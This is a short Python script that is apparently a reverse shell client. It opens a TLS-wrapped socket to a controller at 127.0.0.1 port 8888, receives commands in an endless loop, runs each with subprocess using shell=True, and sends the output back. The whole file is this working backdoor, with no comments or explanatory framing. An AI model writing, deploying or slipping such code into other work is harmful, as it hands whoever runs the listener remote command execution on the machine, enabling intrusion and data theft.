import subprocess
import socket
import ssl
host = '127.0.0.1'
port = 8888

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

Ssocket = ssl.wrap_socket(sock,ssl_version=ssl.PROTOCOL_TLSv1)

Ssocket.connect((host,port))

while True:
	command = Ssocket.recv(1024).decode()
	process  = subprocess.Popen(command ,stdout = subprocess.PIPE, stderr=subprocess.PIPE , shell=True)
	result = process.stdout.read() + process.stderr.read()
	Ssocket.send(result)
